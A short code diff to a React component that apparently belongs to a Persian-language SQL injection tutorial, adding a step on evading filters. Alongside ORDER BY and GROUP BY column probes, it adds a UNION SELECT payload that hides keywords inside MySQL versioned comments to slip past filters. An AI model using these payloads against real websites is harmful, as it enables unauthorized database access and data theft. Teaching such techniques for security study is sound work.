@@ -54,6 +54,13 @@ export default function FourthStep({ url }: { url: string }) {
             </span>
             <Code>{`1) ${url} order by 123123--`}</Code>
             <Code>{`2) ${url} group by 123123`}</Code>
+            <TextNote>
+              در صورتی که در مراحل بعد از uinon select هم با خطاهای مراحل قبل مواجه شویم، لازم است روش های دور زدن را
+              روی دستورات دیگر شامل group_concat, from, where و... نیز اعمال کنیم. به کد زیر توجه کنید:
+            </TextNote>
+            <Code>
+              <Code>{`${url} /*!12345 union*/ select 1,2,3,4 /*!12345from*/ ... /*!12345where*/ ...`}</Code>
+            </Code>
             <span>
               این بخش آپدیت خواهد شد.
               {/*TODO*/}
